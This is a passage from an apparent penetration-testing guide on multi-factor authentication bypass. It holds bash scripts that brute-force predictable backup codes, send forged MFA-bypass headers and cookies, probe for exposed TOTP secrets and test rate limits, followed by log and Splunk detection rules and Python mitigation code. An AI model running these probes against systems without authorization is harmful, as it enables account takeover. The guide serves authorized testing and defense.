    if echo "$response" | grep -i "x-sms\|x-code\|x-debug" > /dev/null; then
        echo "[!] Suspicious headers found:"
        echo "$response" | grep -i "x-sms\|x-code\|x-debug"
    fi
}

# Function to test backup code vulnerabilities
test_backup_codes() {
    local url=$1
    local app_name=$2

    echo "[*] Testing backup codes for $app_name..."

    # Test predictable backup codes
    predictable_codes=("000000" "111111" "123456" "654321" "112233" "445566")

    for code in "${predictable_codes[@]}"; do
        response=$(curl -s -w "%{http_code}" -X POST "$url/api/mfa/backup" \
            -H "Content-Type: application/json" \
            -d "{\"backup_code\":\"$code\"}")

        http_code="${response: -3}"
        if [[ "$http_code" == "200" ]]; then
            echo "[!] Valid backup code found: $code"
        fi
    done
}

# Function to test MFA setup vulnerabilities
test_mfa_setup() {
    local url=$1
    local app_name=$2

    echo "[*] Testing MFA setup for $app_name..."

    # Test TOTP secret exposure
    response=$(curl -s "$url/api/2fa/setup")

    if echo "$response" | grep -oE '[A-Z2-7]{32}' > /dev/null; then
        echo "[!] TOTP secret potentially exposed:"
        echo "$response" | grep -oE '[A-Z2-7]{32}'
    fi

    # Test QR code manipulation
    response=$(curl -s "$url/api/2fa/qr?user=admin&secret=JBSWY3DPEHPK3PXP")

    if [[ $(echo "$response" | wc -c) -gt 100 ]]; then
        echo "[!] QR code generation accepts arbitrary parameters"
    fi
}

# Function to test MFA bypass methods
test_mfa_bypass() {
    local url=$1
    local app_name=$2

    echo "[*] Testing MFA bypass methods for $app_name..."

    # Test session manipulation
    bypass_headers=("X-MFA-Verified: true" "X-Skip-MFA: 1" "X-2FA-Bypass: admin")

    for header in "${bypass_headers[@]}"; do
        response=$(curl -s -w "%{http_code}" -H "$header" "$url/profile")
        http_code="${response: -3}"

        if [[ "$http_code" == "200" ]]; then
            echo "[!] MFA bypass possible with header: $header"
        fi
    done

    # Test cookie manipulation
    bypass_cookies=("mfa_verified=true" "bypass_2fa=1" "skip_mfa=admin")

    for cookie in "${bypass_cookies[@]}"; do
        response=$(curl -s -w "%{http_code}" -b "$cookie" "$url/profile")
        http_code="${response: -3}"

        if [[ "$http_code" == "200" ]]; then
            echo "[!] MFA bypass possible with cookie: $cookie"
        fi
    done
}

# Function to test rate limiting
test_rate_limiting() {
    local url=$1
    local app_name=$2
    local endpoint=$3

    echo "[*] Testing rate limiting for $endpoint..."

    success_count=0

    for i in {1..20}; do
        response=$(curl -s -w "%{http_code}" -X POST "$url$endpoint" \
            -H "Content-Type: application/json" \
            -d '{"code":"123456"}')

        http_code="${response: -3}"

        if [[ "$http_code" != "429" ]]; then
            ((success_count++))
        else
            echo "[*] Rate limited after $i requests"
            break
        fi
    done

    if [[ $success_count -gt 10 ]]; then
        echo "[!] Weak or no rate limiting detected ($success_count successful requests)"
    fi
}

# Main testing loop
for i in "${!TARGET_APPS[@]}"; do
    url="${TARGET_APPS[$i]}"
    name="${APP_NAMES[$i]}"

    echo ""
    echo "Testing $name at $url"
    echo "========================================"

    # Check if application is accessible
    if ! curl -s --connect-timeout 5 "$url" > /dev/null; then
        echo "[-] $name is not accessible at $url"
        continue
    fi

    # Run MFA tests
    test_mfa_setup "$url" "$name"
    test_totp_bypass "$url" "$name"
    test_sms_bypass "$url" "$name"
    test_backup_codes "$url" "$name"
    test_mfa_bypass "$url" "$name"

    # Test rate limiting on various endpoints
    test_rate_limiting "$url" "$name" "/api/2fa/verify"
    test_rate_limiting "$url" "$name" "/api/sms/send"

    echo "[*] $name testing complete"
done

echo ""
echo "=== MFA Bypass Testing Complete ==="
```

### TOTP Analysis Script

```bash
#!/bin/bash
# TOTP Token Analysis Script

echo "=== TOTP Token Analysis ==="

# Function to generate TOTP code (requires oathtool)
generate_totp() {
    local secret=$1
    local time_offset=${2:-0}

    if command -v oathtool > /dev/null; then
        oathtool --totp -b "$secret" --time-step-size=30s --start-time="$(date -d "$time_offset seconds" +%s)"
    else
        echo "oathtool not installed"
    fi
}

# Function to analyze TOTP secrets
analyze_totp_secret() {
    local secret=$1

    echo "Analyzing TOTP secret: $secret"
    echo "Length: ${#secret}"

    # Check if valid Base32
    if [[ $secret =~ ^[A-Z2-7]+$ ]]; then
        echo "Format: Valid Base32"
    else
        echo "Format: Invalid Base32"
    fi

    # Check common weak secrets
    weak_secrets=("JBSWY3DPEHPK3PXP" "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ" "MFRGG")

    for weak in "${weak_secrets[@]}"; do
        if [[ "$secret" == "$weak" ]]; then
            echo "[!] WARNING: Using common test secret"
            break
        fi
    done

    echo "---"
}

# Function to test time window
test_time_window() {
    local secret=$1

    echo "Testing TOTP time window for secret: $secret"

    if command -v oathtool > /dev/null; then
        current_time=$(date +%s)

        # Test codes from different time periods
        for offset in -300 -120 -60 -30 0 30 60 120 300; do
            test_time=$((current_time + offset))
            code=$(oathtool --totp -b "$secret" --time-step-size=30s --start-time="$test_time")
            echo "Offset ${offset}s: $code"
        done
    else
        echo "oathtool required for TOTP generation"
    fi

    echo "---"
}

# Example TOTP secrets for testing
test_secrets=(
    "JBSWY3DPEHPK3PXP"
    "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"
    "MFRGG43FMZQW4Y3PNZ2HE2LOM4QGC3TPNZRWS3DFMQ"
)

echo "Analyzing test TOTP secrets..."

for secret in "${test_secrets[@]}"; do
    analyze_totp_secret "$secret"
    test_time_window "$secret"
done

echo "TOTP analysis complete."
```

## Detection Methods

### Log Analysis for MFA Bypass

```bash
# Monitor MFA bypass attempts
grep -i "mfa\|2fa\|totp" /var/log/webapp/access.log | grep -E "(bypass|skip|disable)"

# Check for multiple MFA verification attempts
grep "POST.*verify" /var/log/webapp/access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Monitor suspicious MFA setup requests
grep "mfa.*setup\|2fa.*setup" /var/log/webapp/access.log | grep -v "GET"
```

### SIEM Detection Rules

```yaml
# Splunk: Multiple MFA failures
index=webapp sourcetype=access_combined
| search uri_path="*mfa*verify*" OR uri_path="*2fa*verify*"
| search status!=200
| stats count by src_ip
| where count > 5

# Multiple TOTP attempts
index=webapp
| search "totp" OR "authenticator"
| search "verify" OR "check"
| stats count by src_ip, user
| where count > 10
```

## Mitigation Strategies

### 1. Secure MFA Implementation

```python
# Secure MFA verification
import time
import hashlib
import secrets

class SecureMFAVerifier:
    def __init__(self):
        self.attempt_tracker = {}
        self.max_attempts = 3
        self.lockout_duration = 300  # 5 minutes

    def verify_totp(self, user_id, provided_code, user_secret):
        # Check rate limiting
        if not self.check_rate_limit(user_id):
            return False, "Rate limit exceeded"

        # Verify TOTP with limited time window
        current_time = int(time.time())
        time_step = 30

        # Only accept codes from current and previous time window
        valid_times = [current_time - time_step, current_time]

        for test_time in valid_times:
            expected_code = self.generate_totp(user_secret, test_time)
            if self.constant_time_compare(provided_code, expected_code):
                # Check for replay attacks
                if not self.check_code_reuse(user_id, provided_code):
                    return False, "Code already used"

                self.reset_attempts(user_id)
                return True, "Valid code"

        # Invalid code
        self.record_failed_attempt(user_id)
        return False, "Invalid code"

    def constant_time_compare(self, a, b):
        """Constant-time string comparison to prevent timing attacks"""
        if len(a) != len(b):
            return False
        result = 0
        for x, y in zip(a, b):
            result |= ord(x) ^ ord(y)
        return result == 0
```

### 2. Rate Limiting Implementation

```python
# MFA rate limiting
from datetime import datetime, timedelta
from collections import defaultdict

class MFARateLimiter:
    def __init__(self):
        self.attempts = defaultdict(list)
        self.lockouts = {}

    def is_allowed(self, identifier, max_attempts=5, window_minutes=5):
        now = datetime.now()

        # Check if user is locked out
        if identifier in self.lockouts:
            if now < self.lockouts[identifier]:
                return False
            else:
                del self.lockouts[identifier]

        # Clean old attempts
        window_start = now - timedelta(minutes=window_minutes)
        self.attempts[identifier] = [
            attempt for attempt in self.attempts[identifier]
            if attempt > window_start
        ]

        # Check if under limit
        if len(self.attempts[identifier]) >= max_attempts:
            # Lock out user
            self.lockouts[identifier] = now + timedelta(minutes=15)
            return False

        self.attempts[identifier].append(now)
        return True
```

## Legal and Ethical Considerations

⚠️ **WARNING**: These techniques are for authorized testing only:

- Only test applications you own or have explicit permission to test
- Be aware of privacy laws regarding SMS/phone testing
- Don't attempt to intercept real user communications
- Document all testing activities thoroughly
- Follow responsible disclosure for vulnerabilities found

## References

- [OWASP MFA Guidelines](https://owasp.org/www-community/controls/Multi_Factor_Authentication)
- [NIST SP 800-63B Authentication Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [RFC 6238 - TOTP Specification](https://tools.ietf.org/html/rfc6238)
- [SMS Security Best Practices](https://www.nist.gov/publications/sms-security)
